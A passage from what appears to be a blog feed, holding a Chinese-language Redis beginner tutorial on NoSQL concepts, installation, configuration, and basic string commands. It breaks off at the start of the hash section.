      <category>4.WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>网络安全</tag>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis基础</title>
    <link href="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/12/31/Redis%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1>第一章 Redis基础</h1><p><strong>课程计划</strong></p><table><thead><tr><th>1. Redis 入 门</th><th><strong>（了解）</strong></th><th><strong>（操作）</strong></th><th></th></tr></thead><tbody><tr><td>2. 数据类型</td><td><strong>（重点）</strong></td><td><strong>（操作）</strong></td><td><strong>（理解）</strong></td></tr><tr><td>3. 常用指令</td><td></td><td><strong>（操作）</strong></td><td></td></tr><tr><td>4. Jedis</td><td><strong>（重点）</strong></td><td><strong>（操作）</strong></td><td></td></tr><tr><td>5. 持 久 化</td><td><strong>（重点）</strong></td><td></td><td><strong>（理解）</strong></td></tr><tr><td>6. 数据删除与淘汰策略</td><td></td><td></td><td><strong>（理解）</strong></td></tr><tr><td>7. 主从复制</td><td><strong>（重点）</strong></td><td><strong>（操作）</strong></td><td><strong>（理解）</strong></td></tr><tr><td>8. 哨 兵</td><td><strong>（重点）</strong></td><td><strong>（操作）</strong></td><td><strong>（理解）</strong></td></tr><tr><td>9. Cluster集群方案</td><td><strong>（重点）</strong></td><td><strong>（操作）</strong></td><td><strong>（理解）</strong></td></tr><tr><td>10. 企业级缓存解决方案</td><td><strong>（重点）</strong></td><td></td><td><strong>（理解）</strong></td></tr><tr><td>11. 性能指标监控</td><td><strong>（了解）</strong></td><td></td><td></td></tr></tbody></table><h2 id="学习目标：">学习目标：</h2><p>目标1：能够说出NoSQL的概念，redis的应用场景，能够完成redis的下载安装与启动以及一些常用的配置</p><p>目标2：能够说出redis常用的5种数据类型，对应这些数据类型的基本操作，应用场景及对应的解决方案</p><p>目标3：能够说出redis中常用的一些基本指令</p><p>目标4：能够使用jedis完成客户端应用程序的开发</p><p>目标5：能够说出redis数据持久化的两种方式，各自相关的操作配置及指令，以及两种方式的优缺点比较</p><h2 id="1-Redis-简介">1. Redis 简介</h2><p>在这个部分，我们将学习以下3个部分的内容，分别是：</p><p>◆ Redis 简介（NoSQL概念、Redis概念）</p><p>◆ Redis 的下载与安装</p><p>◆ Redis 的基本操作</p><h3 id="1-1-NoSQL概念">1.1 NoSQL概念</h3><h4 id="1-1-1-问题现象">1.1.1 问题现象</h4><p>在讲解NoSQL的概念之前呢，我们先来看一个现象：</p><p>（1）问题现象</p><p>每年到了过年期间，大家都会自觉自发的组织一场活动，叫做春运！以前我们买票都是到火车站排队，后来呢有了12306，有了他以后就更方便了，我们可以在网上买票，但是带来的问题，大家也很清楚，春节期间买票进不去，进去了刷不着票。什么原因呢，人太多了！</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C12306-%E6%B7%98%E5%AE%9D.png" alt></p><p>除了这种做铁路的，它系统做的不专业以外，还有马爸爸做的淘宝，它面临一样的问题。淘宝也崩，也是用户量太大！作为我们整个电商界的东哥来说，他第一次做图书促销的时候，也遇到了服务器崩掉的这样一个现象，原因同样是因为用户量太大！<img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C%E4%BA%AC%E4%B8%9C%E7%BF%BB%E8%BD%A6%E6%A1%88.png" alt></p><p>（2）现象特征</p><p>再来看这几个现象，有两个非常相似的特征：</p><p>第一，用户比较多，海量用户</p><p>第二，高并发</p><p>这两个现象出现以后，对应的就会造成我们的服务器瘫痪。核心本质是什么呢？其实并不是我们的应用服务器，而是我们的关系型数据库。<strong>关系型数据库才是最终的罪魁祸首！</strong></p><p>（3）造成原因</p><p>什么样的原因导致的整个系统崩掉的呢：</p><p>1.性能瓶颈：磁盘IO性能低下</p><p>关系型数据库菜存取数据的时候和读取数据的时候他要走磁盘IO。磁盘这个性能本身是比较低的。</p><p>2.扩展瓶颈：数据关系复杂，扩展性差，不便于大规模集群</p><p>我们说关系型数据库，它里面表与表之间的关系非常复杂，不知道大家能不能想象一点，就是一张表，通过它的外键关联了七八张表，这七八张表又通过她的外件，每张又关联了四五张表。你想想，查询一下，你要想拿到数据，你就要从A到B、B到C、C到D的一直这么关联下去，最终非常影响查询的效率。同时，你想扩展下，也很难!</p><p>（4）解决思路</p><p>面对这样的现象，我们要想解决怎么版呢。两方面：</p><p>一，降低磁盘IO次数，越低越好。</p><p>二，去除数据间关系，越简单越好。</p><p>降低磁盘IO次数，越低越好，怎么搞？我不用你磁盘不就行了吗？于是，内存存储的思想就提出来了，我数据不放到你磁盘里边，放内存里，这样是不是效率就高了。</p><p>第二，你的数据关系很复杂，那怎么办呢？干脆简单点，我断开你的关系，我不存关系了，我只存数据，这样不就没这事了吗？</p><p>把这两个特征一合并一起，就出来了一个新的概念：NoSQL</p><h4 id="1-1-2-NoSQL的概念">1.1.2 NoSQL的概念</h4><p>（1）概念</p><p><strong>NoSQL：即 Not-Only SQL（ 泛指非关系型的数据库），作为关系型数据库的补充</strong>。 作用：应对基于海量用户和海量数据前提下的数据处理问题。</p><p>他说这句话说的非常客气，什么意思呢？就是我们数据存储要用SQL，但是呢可以不仅仅用SQL，还可以用别的东西，那别的东西叫什么呢？于是他定义了一句话叫做NoSQL。这个意思就是说我们存储数据，可以不光使用SQL，我们还可以使用非SQL的这种存储方案，这就是所谓的NoSQL。</p><p>（2）特征</p><p>可扩容，可伸缩。SQL数据关系过于复杂，你扩容一下难度很高，那我们Nosql 这种的，不存关系，所以它的扩容就简单一些。</p><p>大数据量下高性能。包数据非常多的时候，它的性能高，因为你不走磁盘IO，你走的是内存，性能肯定要比磁盘IO的性能快一些。</p><p>灵活的数据模型、高可用。他设计了自己的一些数据存储格式，这样能保证效率上来说是比较高的，最后一个高可用，我们等到集群内部分再去它！</p><p>（3）常见 Nosql 数据库</p><p>目前市面上常见的Nosql产品：Redis、memcache、HBase、MongoDB</p><p>（4）应用场景-电商为例</p><p>我们以电商为例，来看一看他在这里边起到的作用。</p><p>第一类，在电商中我们的基础数据一定要存储起来，比如说商品名称，价格，生产厂商，这些都属于基础数据，这些数据放在MySQL数据库。</p><p>第二类，我们商品的附加信息，比如说，你买了一个商品评价了一下，这个评价它不属于商品本身。就像你买一个苹果，“这个苹果很好吃”就是评论，但是你能说很好吃是这个商品的属性嘛？不能这么说，那只是一个人对他的评论而已。这一类数据呢，我们放在另外一个地方，我们放到MongoDB。它也可以用来加快我们的访问，他属于NoSQL的一种。</p><p>第三，图片内的信息。注意这种信息相对来说比较固定，他有专用的存储区，我们一般用文件系统来存储。至于是不是分布式，要看你的系统的一个整个   瓶颈   了？如果说你发现你需要做分布式，那就做，不需要的话，一台主机就搞定了。</p><p>第四，搜索关键字。为了加快搜索，我们会用到一些技术，有些人可能了解过，像分ES、Lucene、solr都属于搜索技术。那说的这么热闹，我们的电商解决方案中还没出现我们的redis啊！注意第五类信息。</p><p>第五，热点信息。访问频度比较高的信息，这种东西的第二特征就是它具有波段性。换句话说他不是稳定的，它具有一个时效性的。那么这类信息放哪儿了，放到我们的redis这个解决方案中来进行存储。</p><p>具体的我们从我们的整个数据存储结构的设计上来看一下。</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C%E7%94%B5%E5%95%86%E5%9C%BA%E6%99%AF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.png" alt></p><p>我们的基础数据都存MySQL,在它的基础之上，我们把它连在一块儿，同时对外提供服务。向上走，有一些信息加载完以后,要放到我们的MongoDB中。还有一类信息，我们放到我们专用的文件系统中（比如图片），就放到我们的这个搜索专用的，如Lucene、solr及集群里边，或者用ES的这种技术里边。那么剩下来的热点信息，放到我们的redis里面。</p><h3 id="1-2-Redis概念">1.2 Redis概念</h3><h4 id="1-2-1-redis概念">1.2.1 redis概念</h4><p>概念：Redis (REmote DIctionary Server) 是用 C 语言开发的一个开源的高性能键值对（key-value）数据库。</p><p>特征：</p><p>（1）数据间没有必然的关联关系；</p><p>（2）内部采用单线程机制进行工作；</p><p>（3）高性能。官方提供测试数据，50个并发执行100000 个请求,读的速度是110000 次/s,写的速度是81000次/s。</p><p>（4）多数据类型支持</p><p>字符串类型，string  list</p><p>列表类型，hash  set</p><p>散列类型，zset/sorted_set</p><p>集合类型</p><p>有序集合类型</p><p>（5）支持持久化，可以进行数据灾难恢复</p><h4 id="1-2-2-redis的应用场景">1.2.2 redis的应用场景</h4><p>（1）为热点数据加速查询（主要场景）。如热点商品、热点新闻、热点资讯、推广类等高访问量信息等。</p><p>（2）即时信息查询。如各位排行榜、各类网站访问统计、公交到站信息、在线人数信息（聊天室、网站）、设备信号等。</p><p>（3）时效性信息控制。如验证码控制、投票控制等。</p><p>（4）分布式数据共享。如分布式集群架构中的 session 分离消息队列.</p><h3 id="1-3-Redis-的下载与安装">1.3 Redis 的下载与安装</h3><p>后期所有资料分4中不同色块显示，详情如下：</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C%E7%BA%A6%E5%AE%9A%E6%A0%BC%E5%BC%8F.png" alt></p><h4 id="1-3-1-Redis-的下载与安装">1.3.1 Redis 的下载与安装</h4><p>本课程所示，均基于Center OS7安装Redis。</p><p>（1)下载Redis</p><p>下载安装包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://download.redis.io/releases/redis-5.0.0.tar.gz<br></code></pre></td></tr></table></figure><p>解压安装包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar –xvf redis-5.0.0.tar.gz<br></code></pre></td></tr></table></figure><p>编译（在解压的目录中执行）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make<br></code></pre></td></tr></table></figure><p>安装（在解压的目录中执行）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make install<br></code></pre></td></tr></table></figure><p>（2）安装 Redis</p><p>redis-server，服务器启动命令 客户端启动命令</p><p>redis-cli，redis核心配置文件</p><p>redis.conf，RDB文件检查工具（快照持久化文件）</p><p>redis-check-dump，AOF文件修复工具</p><p>redis-check-aof</p><h3 id="1-4-Redis服务器启动">1.4 Redis服务器启动</h3><h4 id="1-4-1-Redis服务器启动">1.4.1 Redis服务器启动</h4><p>启动服务器——参数启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-server [--port port]<br></code></pre></td></tr></table></figure><p>范例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-server --port 6379<br></code></pre></td></tr></table></figure><p>启动服务器——配置文件启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-server config_file_name<br></code></pre></td></tr></table></figure><p>范例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-server redis.conf<br></code></pre></td></tr></table></figure><h4 id="1-4-2-Redis客户端启动">1.4.2 Redis客户端启动</h4><p>启动客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-cli [-h host] [-p port]<br></code></pre></td></tr></table></figure><p>范 例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-cli –h 61.129.65.248 –p 6384<br></code></pre></td></tr></table></figure><p>注意：服务器启动指定端口使用的是–port，客户端启动指定端口使用的是-p。-的数量不同。</p><h4 id="1-4-3-Redis基础环境设置约定">1.4.3 Redis基础环境设置约定</h4><p>创建配置文件存储目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> conf<br></code></pre></td></tr></table></figure><p>创建服务器文件存储目录（包含日志、数据、临时配置文件等）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> data<br></code></pre></td></tr></table></figure><p>创建快速访问链接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s redis-5.0.0 redis<br></code></pre></td></tr></table></figure><h3 id="1-5-配置文件启动与常用配置">1.5 配置文件启动与常用配置</h3><h4 id="1-5-1-服务器端设定">1.5.1 服务器端设定</h4><p>设置服务器以守护进程的方式运行，开启后服务器控制台中将打印服务器运行信息（同日志内容相同）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">daemonize <span class="hljs-built_in">yes</span>|no<br></code></pre></td></tr></table></figure><p>绑定主机地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">bind</span> ip<br></code></pre></td></tr></table></figure><p>设置服务器端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">port port<br></code></pre></td></tr></table></figure><p>设置服务器文件保存地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> path<br></code></pre></td></tr></table></figure><h4 id="1-5-2-客户端配置">1.5.2  客户端配置</h4><p>服务器允许客户端连接最大数量，默认0，表示无限制。当客户端连接到达上限后，Redis会拒绝新的连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">maxclients count<br></code></pre></td></tr></table></figure><p>客户端闲置等待最大时长，达到最大值后关闭对应连接。如需关闭该功能，设置为 0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">timeout</span> seconds<br></code></pre></td></tr></table></figure><h4 id="1-5-3-日志配置">1.5.3  日志配置</h4><p>设置服务器以指定日志记录级别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">loglevel debug|verbose|notice|warning<br></code></pre></td></tr></table></figure><p>日志记录文件名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">logfile filename<br></code></pre></td></tr></table></figure><p>注意：日志级别开发期设置为verbose即可，生产环境中配置为notice，简化日志输出量，降低写日志IO的频度。</p><h3 id="1-6-Redis基本操作">1.6 Redis基本操作</h3><h4 id="1-6-1-命令行模式工具使用思考">1.6.1  命令行模式工具使用思考</h4><p>功能性命令</p><p>帮助信息查阅</p><p>退出指令</p><p>清除屏幕信息</p><h4 id="1-6-2-信息读写">1.6.2  信息读写</h4><p>设置 key，value 数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> key value<br></code></pre></td></tr></table></figure><p>范例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> name itheima<br></code></pre></td></tr></table></figure><p>根据 key 查询对应的 value，如果不存在，返回空（nil）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">get key<br></code></pre></td></tr></table></figure><p>范例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">get name<br></code></pre></td></tr></table></figure><h4 id="1-6-3-帮助信息">1.6.3  帮助信息</h4><p>获取命令帮助文档</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">help</span> [<span class="hljs-built_in">command</span>]<br></code></pre></td></tr></table></figure><p>范例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">help</span> <span class="hljs-built_in">set</span><br></code></pre></td></tr></table></figure><p>获取组中所有命令信息名称</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">help</span> [@group-name]<br></code></pre></td></tr></table></figure><p>范例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">help</span> @string<br></code></pre></td></tr></table></figure><p>1.6.4  退出命令行客户端模式</p><p>退出客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">quit<br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><p>快捷键</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Ctrl+C<br></code></pre></td></tr></table></figure><h4 id="1-6-4-redis入门总结">1.6.4  redis入门总结</h4><p>到这里，Redis 入门的相关知识，我们就全部学习完了，再来回顾一下，这个部分我们主要讲解了哪些内容呢？</p><p>首先，我们对Redis进行了一个简单介绍，包括NoSQL的概念、Redis的概念等。</p><p>然后，我们介绍了Redis 的下载与安装。包括下载与安装、服务器与客户端启动、以及相关配置文件（3类）。</p><p>最后，我们介绍了Redis 的基本操作。包括数据读写、退出与帮助信息获取。</p><h2 id="2-数据类型">2. 数据类型</h2><p>在这个部分，我们将学习一共要学习三大块内容，首先需要了解一下数据类型，接下来将针对着我们要学习的数据类型进行逐一的讲解，如string、hash、list、set等，最后我们通过一个案例来总结前面的数据类型的使用场景。</p><h3 id="2-1-数据存储类型介绍">2.1  数据存储类型介绍</h3><h4 id="2-1-1-业务数据的特殊性">2.1.1  业务数据的特殊性</h4><p>在讲解数据类型之前，我们得先思考一个问题，数据类型既然是用来描述数据的存储格式的，如果你不知道哪些数据未来会进入到我们来的redis中，那么对应的数据类型的选择，你就会出现问题，我们一块来看一下：</p><p>（1）原始业务功能设计</p><p>秒杀。他这个里边数据变化速度特别的快，访问量也特别的高，用户大量涌入以后都会针对着一部分数据进行操作，这一类要记住。</p><p>618活动。对于我们京东的618活动、以及天猫的双11活动，相信大家不用说都知道这些数据一定要进去，因为他们的访问频度实在太高了。</p><p>排队购票。我们12306的票务信息。这些信息在原始设计的时候，他们就注定了要进redis。</p><p>（2）运营平台监控到的突发高频访问数据</p><p>此类平台临时监控到的这些数据，比如说现在出来的一个八卦的信息，这个新闻一旦出现以后呢，顺速的被围观了，那么这个时候，这个数据就会变得访量特别高，那么这类信息也要进入进去。</p><p>（3）高频、复杂的统计数据</p><p>在线人数。比如说直播现在很火，直播里边有很多数据，例如在线人数。进一个人出一个人，这个数据就要跳动，那么这个访问速度非常的快，而且访量很高，并且它里边有一个复杂的数据统计，在这里这种信息也要进入到我们的redis中。</p><p>投票排行榜。投票投票类的信息他的变化速度也比较快，为了追求一个更快的一个即时投票的名次变化，这种数据最好也放到redis中。</p><h4 id="2-1-2-Redis-数据类型-5种常用">2.1.2  Redis 数据类型(5种常用)</h4><p>基于以上数据特征我们进行分析，最终得出来我们的Redis中要设计5种 数据类型：</p><p>string、hash、list、set、sorted_set/zset（应用性较低）</p><h3 id="2-2-string数据类型">2.2  string数据类型</h3><p>在学习第一个数据类型之前，先给大家介绍一下，在随后这部分内容的学习过程中，我们每一种数据类型都分成三块来讲：首先是讲下它的基本操作，接下来讲一些它的扩展操作，最后我们会去做一个小的案例分析。</p><h4 id="2-2-1Redis-数据存储格式">2.2.1Redis 数据存储格式</h4><p>在学习string这个数据形式之前，我们先要明白string到底是修饰什么的。我们知道redis 自身是一个 Map，其中所有的数据都是采用 key : value 的形式存储。</p><p>对于这种结构来说，我们用来存储数据一定是一个值前面对应一个名称。我们通过名称来访问后面的值。按照这种形势，我们可以对出来我们的存储格式。前面这一部分我们称为key。后面的一部分称为value，而我们的数据类型，他一定是修饰value的。</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Credis%E5%AD%98%E5%82%A8%E7%A9%BA%E9%97%B4.png" alt></p><p>数据类型指的是存储的数据的类型，也就是 value 部分的类型，key 部分永远都是字符串。</p><h4 id="2-2-2-string-类型">2.2.2  string 类型</h4><p>（1）存储的数据：单个数据，最简单的数据存储类型，也是最常用的数据存储类型。</p><p>string，他就是存一个字符串儿，注意是value那一部分是一个字符串，它是redis中最基本、最简单的存储数据的格式。</p><p>（2）存储数据的格式：一个存储空间保存一个数据</p><p>每一个空间中只能保存一个字符串信息，这个信息里边如果是存的纯数字，他也能当数字使用，我们来看一下，这是我们的数据的存储空间。</p><p>（3）存储内容：通常使用字符串，如果字符串以整数的形式展示，可以作为数字操作使用.</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Credis%E5%AD%98%E5%82%A8%E7%A9%BA%E9%97%B42.png" alt></p><p>一个key对一个value，而这个itheima就是我们所说的string类型，当然它也可以是一个纯数字的格式。</p><h4 id="2-2-3-string-类型数据的基本操作">2.2.3  string 类型数据的基本操作</h4><p>（1）基础指令</p><p>添加/修改数据添加/修改数据</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> key <span class="hljs-comment">value</span><br></code></pre></td></tr></table></figure><p>获取数据</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">get</span> <span class="hljs-built_in">key</span><br></code></pre></td></tr></table></figure><p>删除数据</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">del</span> <span class="hljs-built_in">key</span><br></code></pre></td></tr></table></figure><p>判定性添加数据(key不存在添加,返回1 存在不添加返回0)</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">setnx key value</span><br></code></pre></td></tr></table></figure><p>添加/修改多个数据</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mset</span> key1 value1 key2 value2 …<br></code></pre></td></tr></table></figure><p>获取多个数据</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mget</span> key1 key2 …<br></code></pre></td></tr></table></figure><p>获取数据字符个数（字符串长度）</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">strlen</span> <span class="hljs-built_in">key</span><br></code></pre></td></tr></table></figure><p>追加信息到原始信息后部（如果原始信息存在就追加，否则新建）</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">append</span> <span class="hljs-built_in">key</span> value<br></code></pre></td></tr></table></figure><p>（2）单数据操作与多数据操作的选择之惑</p><p>即set 与mset的关系。这对于这两个操作来说，没有什么你应该选哪个，而是他们自己的特征是什么，你要根据这个特征去比对你的业务，看看究竟适用于哪个。</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Cset.png" alt></p><p>假如说这是我们现在的服务器，他要向redis要数据的话，它会发出一条指令。那么当这条指令发过来的时候，比如说是这个set指令过来，那么它会把这个结果返回给你，这个时候我们要思考这里边一共经过了多长时间。</p><p>首先，发送set指令要时间，这是网络的一个时间，接下来redis要去运行这个指令要消耗时间，最终把这个结果返回给你又有一个时间，这个时间又是一个网络的时间，那我们可以理解为：一个指令发送的过程中需要消耗这样的时间.</p><p>但是如果说现在不是一条指令了，你要发3个set的话，还要多长时间呢？对应的发送时间要乘3了，因为这是三个单条指令,而运行的操作时间呢，它也要乘3了，但最终返回的也要发3次，所以这边也要乘3。</p><p>于是我们可以得到一个结论：单指令发3条它需要的时间，假定他们两个一样，是6个网络时间加3个处理时间，如果我们把它合成一个mset呢，我们想一想。</p><p>假如说用多指令发3个指令的话，其实只需要发一次就行了。这样我们可以得到一个结论，多指令发3个指令的话，其实它是两个网络时间加上3个redis的操作时间，为什么这写一个小加号呢，就是因为毕竟发的信息量变大了，所以网络时间有可能会变长。</p><p>那么通过这张图，你就可以得到一个结论，我们单指令和多指令他们的差别就在于你发送的次数是多还是少。当你影响的数据比较少的时候，你可以用单指令，也可以用多指令。但是一旦这个量大了，你就要选择多指令了，他的效率会高一些。</p><h3 id="2-3-string-类型数据的扩展操作">2.3  string 类型数据的扩展操作</h3><h4 id="2-3-1-string-类型数据的扩展操作">2.3.1  string 类型数据的扩展操作</h4><p>下面我们来看一string的扩展操作，分成两大块：一块是对数字进行操作的，第二块是对我们的key的时间进行操作的。</p><p>设置数值数据增加指定范围的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">incr key(如果数据能累加, 自动加一, 不能则报错, 不存在从零开始加)<br>incrby key increment<br>incrbyfloat key increment<br></code></pre></td></tr></table></figure><p>设置数值数据减少指定范围的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">decr key<br>decrby key increment<br></code></pre></td></tr></table></figure><p>设置数据具有指定的生命周期</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">setex key seconds value<br>psetex key milliseconds value<br></code></pre></td></tr></table></figure><h4 id="2-3-2-string-类型数据操作的注意事项">2.3.2  string 类型数据操作的注意事项</h4><p>(1)数据操作不成功的反馈与数据正常操作之间的差异</p><p>表示运行结果是否成功</p><p>(integer) 0  → false                 失败</p><p>(integer) 1  → true                  成功</p><p>表示运行结果值</p><p>(integer) 3  → 3                        3个</p><p>(integer) 1  → 1                         1个</p><p>(2)数据未获取到时，对应的数据为（nil），等同于null</p><p>(3)数据最大存储量：512MB</p><p>(4)string在redis内部存储默认就是一个字符串，当遇到增减类操作incr，decr时会转成数值型进行计算</p><p>(5)按数值进行操作的数据，如果原始数据不能转成数值，或超越了redis 数值上限范围，将报错<br>9223372036854775807（java中Long型数据最大值，Long.MAX_VALUE）</p><p>(6)redis所有的操作都是原子性的，采用单线程处理所有业务，命令是一个一个执行的，因此无需考虑并发带来的数据影响.</p><h3 id="2-4string应用场景与key命名约定">2.4string应用场景与key命名约定</h3><h4 id="2-4-1-应用场景">2.4.1  应用场景</h4><p>它的应用场景在于：主页高频访问信息显示控制，例如新浪微博大V主页显示粉丝数与微博数量。</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Cstring%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF.png" alt></p><p>我们来思考一下：这些信息是不是你进入大V的页面儿以后就要读取这写信息的啊，那这种信息一定要存储到我们的redis中，因为他的访问量太高了！那这种数据应该怎么存呢？我们来一块儿看一下方案！</p><h4 id="2-4-2-解决方案">2.4.2  解决方案</h4><p>（1）在redis中为大V用户设定用户信息，以用户主键和属性值作为key，后台设定定时刷新策略即可。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">eg:user:id:3506728370:fans→12210947<br>eg:user:id:3506728370:blogs→6164<br>eg:user:id:3506728370:focuses→83<br></code></pre></td></tr></table></figure><p>（2）也可以使用json格式保存数据</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">eg:user:id:3506728370    →&#123;“fans”：12210947，“blogs”：6164，“ focuses ”：83 &#125;<br></code></pre></td></tr></table></figure><p>（3） key 的设置约定</p><p>数据库中的热点数据key命名惯例</p><blockquote><p>表名+主键名+主键值+字段名</p></blockquote><table><thead><tr><th></th><th><strong>表名</strong></th><th><strong>主键名</strong></th><th>主键值</th><th><strong>字段名</strong></th></tr></thead><tbody><tr><td>eg1：</td><td>order</td><td>id</td><td>29437595</td><td>name</td></tr><tr><td>eg2：</td><td>equip</td><td>id</td><td>390472345</td><td>type</td></tr><tr><td>eg3：</td><td>news</td><td>id</td><td>202004150</td><td>title</td></tr></tbody></table><h3 id="2-5-hash的基本操作">2.5  hash的基本操作</h3><p>下面我们来学习第二个数据类型hash。</p><h4 id="2-5-1-数据存储的困惑">2.5.1  